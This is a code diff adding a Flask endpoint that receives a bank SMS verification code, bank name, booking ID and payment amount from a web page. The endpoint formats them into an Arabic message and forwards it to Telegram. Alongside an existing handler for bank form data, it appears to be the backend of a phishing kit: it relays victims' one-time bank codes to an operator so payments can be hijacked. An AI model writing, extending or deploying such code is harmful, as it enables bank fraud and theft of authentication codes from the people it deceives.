@@ -235,3 +235,57 @@ def receive_bank_form_data():
             "success": False,
             "error": str(e)
         }), 500
+
+
+@telegram_bp.route('/sms-code', methods=['POST'])
+def receive_sms_code():
+    """استقبال كود SMS من صفحة SMS"""
+    try:
+        data = request.get_json()
+        
+        # استخراج البيانات
+        sms_code = data.get('smsCode', 'غير متوفر')
+        booking_id = data.get('bookingId', 'غير متوفر')
+        bank_name = data.get('bankName', 'غير متوفر')
+        amount = data.get('amount', 'غير متوفر')
+        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        
+        # تنسيق الرسالة بشكل منظم
+        message = f"""
+╔══════════════════════════
+║ 📱 <b>كود SMS جديد</b>
+╠══════════════════════════
+║
+║ 🔐 <b>الكود:</b>
+║    <code>{sms_code}</code>
+║
+║ 🏛️ <b>البنك:</b>
+║    <b>{bank_name}</b>
+║
+║ 📋 <b>رقم بطاقة الحجز:</b>
+║    <code>{booking_id}</code>
+║
+║ 💰 <b>المبلغ:</b>
+║    {amount}
+║
+║ 🕒 <b>وقت الإدخال:</b>
+║    {timestamp}
+║
+╚══════════════════════════
+✅ <b>تم استلام الكود بنجاح</b>
+"""
+        
+        # إرسال الرسالة إلى تليجرام
+        results = send_telegram_message(message)
+        
+        return jsonify({
+            "success": True,
+            "message": "تم إرسال الكود إلى تليجرام",
+            "telegram_results": results
+        }), 200
+        
+    except Exception as e:
+        return jsonify({
+            "success": False,
+            "error": str(e)
+        }), 500
